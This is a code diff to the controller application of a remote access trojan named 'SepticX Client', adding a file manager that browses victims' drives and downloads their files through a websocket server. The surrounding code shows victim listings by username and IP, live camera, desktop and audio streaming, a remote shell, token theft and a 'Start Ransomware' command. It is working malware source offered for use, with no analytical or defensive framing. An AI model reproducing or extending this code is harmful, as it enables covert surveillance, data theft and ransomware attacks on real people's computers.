@@ -6,7 +6,7 @@ from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
 from websocket import create_connection
-import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, pyaudio, tkinter, shutil, base64, json, fade, time, glob, zlib, cv2, ssl, os, io
+import multiprocessing, customtkinter, subprocess, websocket, threading, coincurve, requests, datetime, pyaudio, tkinter, shutil, base64, json, fade, time, glob, zlib, cv2, ssl, os, io
 
 customtkinter.set_appearance_mode("dark")
 
@@ -58,6 +58,60 @@ class Profile(customtkinter.CTkFrame):
         address_widget = customtkinter.CTkButton(self, text="More options", command=lambda: Controller(parent, f"{username}|{ip_address}"), corner_radius=0)
         address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
 
+class File(customtkinter.CTkFrame):
+    def __init__(self, master, parent=None, filename="", config=None, row=0, rowspan=1, padx=20, pady=20, title=False):
+        super().__init__(master)
+
+        self.grid(row=row, rowspan=rowspan, column=0, columnspan=15, padx=padx, pady=pady, sticky="nsew")
+
+        for i in range(1): # Set 1 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(7): # Set 7 columns
+            self.columnconfigure(i, weight= 1)
+
+        if title:
+            emoji_widget = customtkinter.CTkButton(self, text="File Name", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            emoji_widget.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
+
+            username_widget = customtkinter.CTkButton(self, text="Date Modified", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            username_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+            ip_address_widget = customtkinter.CTkButton(self, text="File Size", fg_color="gray", text_color_disabled="Black", state="disabled", corner_radius=0)
+            ip_address_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+            address_widget = customtkinter.CTkButton(self, text="Return", fg_color="red", text_color_disabled="Black", command=lambda: threading.Thread(target=parent.list_directory, args=('\\'.join(parent.filename.split("\\")[:-1]),)).start(), corner_radius=10)
+            address_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+            return
+
+        date_modified = datetime.datetime.fromtimestamp(config['modified']).strftime("%Y/%m/%d %I:%M %p")
+        file_size = config['file_size']
+
+        if config['directory']:
+            filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+            filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
+
+            date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+            date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+            file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+            file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+            view_widget = customtkinter.CTkButton(self, text="View Directory", command=lambda: threading.Thread(target=parent.list_directory, args=(filename,)).start(), corner_radius=0)
+            view_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
+            return
+
+        filename_widget = customtkinter.CTkButton(self, text=filename.split("\\")[-1], fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        filename_widget.grid(row=0, column=0, padx=0, sticky="nsew")
+
+        date_modified_widget = customtkinter.CTkButton(self, text=date_modified, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        date_modified_widget.grid(row=0, column=1, columnspan=3, sticky="nsew", padx=0, pady=0)
+
+        file_size_widget = customtkinter.CTkButton(self, text=file_size, fg_color="White", text_color_disabled="Black", state="disabled", corner_radius=0)
+        file_size_widget.grid(row=0, column=4, columnspan=2, sticky="nsew", padx=0, pady=0)
+
+        download_widget = customtkinter.CTkButton(self, text="Download", command=lambda: threading.Thread(target=parent.download, args=(filename,)).start(), corner_radius=0)
+        download_widget.grid(row=0, column=6, columnspan=2, sticky="nsew", padx=0, pady=0)
 
 class Controller(customtkinter.CTkFrame):
     def __init__(self, master, target):
@@ -98,6 +152,7 @@ class Controller(customtkinter.CTkFrame):
                 ('streamCamera', 'Stream Camera'),
                 ('streamDesktop', 'Stream Desktop'),
                 ('streamAudio', 'Stream Audio'),
+                (None, 'File Manager')
             ],
             "Misc": [
                 ('startRansomware', 'Start Ransomware'),
@@ -197,6 +252,14 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
+                elif button_name == "File Manager":
+                    btn = customtkinter.CTkButton(
+                        frame, text=button_name, 
+                        command=lambda command=command: FileManager(master, target), 
+                        fg_color="#1b6e63",
+                        text_color="white"
+                    )
+
                 else:
                     btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: (self.send_command(command, target), tkinter.messagebox.showinfo("SepticX Client", "Successfully executed command")), fg_color="#1b6e63",
                         text_color="white")
@@ -205,7 +268,7 @@ class Controller(customtkinter.CTkFrame):
 
     def send_message_box(self, frame, title, message, target):
         messagebox = self.messagebox
-        self.send_command(f"messageBox:{messagebox}:{title}:{message}", target)
+        self.send_command(f"messageBox|{messagebox}|{title}|{message}", target)
 
         tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")
 
@@ -273,7 +336,7 @@ class Controller(customtkinter.CTkFrame):
         tkinter.messagebox.showinfo("SepticX Client", "Tokens downloaded to tokens.txt")
 
     def update_webhook(self, frame, webhook, target):
-        self.send_command(f"updateWebhook:{webhook}", target)
+        self.send_command(f"updateWebhook|{webhook}", target)
         tkinter.messagebox.showinfo("SepticX Client", "Successfully updated webhook")
         
         frame.destroy()
@@ -381,7 +444,7 @@ class Video(customtkinter.CTkFrame):
                 ws.send(self.server_key)
                 ws.send(self.target)
                 return ws
-            except websocket.WebSocketException:
+            except (websocket.WebSocketException, WindowsError):
                 pass
 
     def kill_proc(self):
@@ -451,7 +514,7 @@ class Audio(customtkinter.CTkFrame):
                 ws.send(self.server_key)
                 ws.send(self.target)
                 return ws
-            except websocket.WebSocketException:
+            except (websocket.WebSocketException, WindowsError):
                 pass
 
     def kill_proc(self):
@@ -477,7 +540,7 @@ class Shell(customtkinter.CTkFrame):
 
         self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
 
-        for i in range(11): # Set 1 rows
+        for i in range(11): # Set 11 rows
             self.rowconfigure(i, weight= 1)
         
         for i in range(1): # Set 1 columns
@@ -506,6 +569,7 @@ class Shell(customtkinter.CTkFrame):
     def kill_proc(self):
         self.stop = True
         self.destroy()
+        self.ws.close()
 
     def get_command_output(self, command):
         ws = self.ws
@@ -514,13 +578,13 @@ class Shell(customtkinter.CTkFrame):
             try:
                 ws.send(command)
                 break
-            except websocket.WebSocketException:
+            except (websocket.WebSocketException, WindowsError):
                 ws = self.connect()
 
         while True:
             try:
                 recv = ws.recv()
-            except websocket.WebSocketException:
+            except (websocket.WebSocketException, WindowsError):
                 ws = self.connect()
 
             if recv == '\n':
@@ -563,8 +627,122 @@ class Shell(customtkinter.CTkFrame):
                 ws.send(self.target)
                 self.ws = ws
                 return ws
-            except websocket.WebSocketException:
+            except (websocket.WebSocketException, WindowsError):
                 pass
+
+
+class FileManager(customtkinter.CTkFrame):
+    def __init__(self, master, target):
+        super().__init__(None)
+
+        self.server_address = master.server_address
+        self.server_key = master.server_key
+        self.target = target
+        self.stop = False
+        self.ws = self.connect()
+        self.filename = ""
+
+        self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
+
+        for i in range(11): # Set 11 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(1): # Set 1 columns
+            self.columnconfigure(i, weight= 1)
+
+        btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
+        btn.grid(row=0, column=0, columnspan=1, padx=5, pady=5, sticky="ew")
+
+        scrollable_frame = customtkinter.CTkScrollableFrame(self, label_text="Current Directory")
+
+        for i in range(15): # Set 15 rows
+            scrollable_frame.rowconfigure(i, weight=1)
+        
+        for i in range(15): # Set 15 columns
+            scrollable_frame.columnconfigure(i, weight=1)
+
+        scrollable_frame.grid(row=1, column=0, rowspan=10, columnspan=1, sticky="nsew")
+
+        scrollable_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=1, rowspan=10)
+
+        File(master=scrollable_frame, parent=self, title=True, pady=1)
+
+        self.scrollable_frame = scrollable_frame
+        threading.Thread(target=self.list_directory, args=("C:\\",)).start()
+
+    def kill_proc(self):
+        self.stop = True
+        self.destroy()
+        self.ws.close()
+
+    def connect(self):
+        while True:
+            try:
+                ws = create_connection(f"wss://{self.server_address}/api/ws/readFiles")
+                ws.send(self.server_key)
+                ws.send(self.target)
+                self.ws = ws
+                return ws
+            except (websocket.WebSocketException, WindowsError):
+                pass
+
+    def download(self, file_path):
+        self.ws.send(f"send_file|{file_path}")
+
+        filename = file_path.split('\\')[-1]
+        filename = f"downloads\\{filename}"
+        
+        offset = 0
+        while True:
+            if os.path.exists(filename):
+                filename = filename[:filename.rindex('.')] + f" ({offset})" + filename[filename.rindex('.'):]
+                offset += 1
+                continue
+
+            open(filename, 'w+').close()
+            break
+
+        with open(filename, 'ab') as file:
+            while True:
+                try:
+                    data = self.ws.recv()
+                    if data == "FIN":
+                        break
+
+                    file.write(zlib.decompress(base64.b64decode(data)))
+                    self.ws.send("ACK")
+                except (websocket.WebSocketException, WindowsError):
+                    break
+
+    def list_directory(self, directory):
+        for child in self.scrollable_frame.winfo_children()[1:]:
+            try:
+                child.destroy()
+            except:
+                pass
+
+        self.scrollable_frame.configure(label_text=directory.replace("\\\\", "\\"))
+        self.filename = directory
+
+        while True:
+            try:
+                path = directory
+                self.ws.send(f"listdir|{path}")
+                recv_data = self.ws.recv()
+                file_info = json.loads(recv_data)
+                break
+            except (websocket.WebSocketException, WindowsError):
+                self.connect()
+
+            except json.JSONDecodeError:
+                break
+
+        row = 0
+        for file in list(file_info):
+            config = file_info[file]
+            print(config)
+            row += 1
+            File(master=self.scrollable_frame, parent=self, filename=file, config=config, row=row, rowspan=1, pady=1)
 
         
 class App(customtkinter.CTk):
